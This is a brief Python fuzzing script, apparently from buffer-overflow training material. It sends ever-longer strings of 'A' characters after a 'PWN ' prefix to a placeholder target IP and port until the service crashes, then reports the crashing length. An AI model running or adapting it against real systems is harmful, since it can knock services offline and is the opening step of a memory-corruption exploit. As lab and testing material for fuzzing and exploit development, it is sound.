#!/usr/bin/env python3

import socket, time, sys

ip = "<TARGET_IP>"

port = 1337 # TARGET_PORT
timeout = 5
prefix = "PWN "

string = prefix + "A" * 10 # Can change 10 to 100, 1000, etc

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      #s.recv(1024) # This line is only needed if the application returns an initial message after connecting
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 10 * "A" # Can change increment to 100, 1000, etc
  time.sleep(1)
